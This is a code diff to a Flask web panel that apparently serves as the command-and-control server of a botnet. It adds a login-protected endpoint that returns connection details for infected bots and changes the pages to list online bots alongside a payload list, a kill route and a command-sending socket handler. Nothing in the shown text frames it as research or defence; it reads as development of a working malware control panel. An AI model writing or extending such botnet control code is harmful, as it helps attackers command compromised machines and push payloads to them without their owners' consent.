@@ -91,6 +91,16 @@ def is_safe_url(next):
 
 # Done with login stuff
 
+@app.route("/bots", methods=['GET'])
+@login_required
+def get_bots():
+    if 'bot' in request.args:
+        botstr = json.dumps(botnet.getConnectionDetails(request.args.get('bot')))
+        return flask.Response(botstr, status=200, mimetype='application/json')
+    else:
+        botstr = json.dumps(botnet.getConnectionDetails())
+        return flask.Response(botstr, status=200, mimetype='application/json')
+
 @app.route('/kill', methods=['POST','GET'])
 @login_required
 def kill_proc():
@@ -210,10 +220,10 @@ def index():
     if 'bot' in request.cookies:
         connected = request.cookies.get('bot')
     resp = flask.make_response(flask.render_template('index.html',
-                                         async_mode=socketio.async_mode,
-                                         bot_list=botnet.getConnections(),
-                                         payload_list=botnet.getPayloadNames(),
-                                         connected=connected))
+                                                     async_mode=socketio.async_mode,
+                                                     bot_list=botnet.getOnlineConnections(),
+                                                     payload_list=botnet.getPayloadNames(),
+                                                     connected=connected))
     if request.method == 'POST':
         resp.set_cookie('bot',request.form.get('bot'))
     return resp
@@ -237,8 +247,8 @@ def finder():
     connected = ''
     if 'bot' in request.cookies:
         connected = request.cookies.get('bot')
-    return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
-                                         connected=connected)
+    return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getOnlineConnections(),
+                                 connected=connected)
 
 
 @socketio.on('send_command', namespace='/bot')
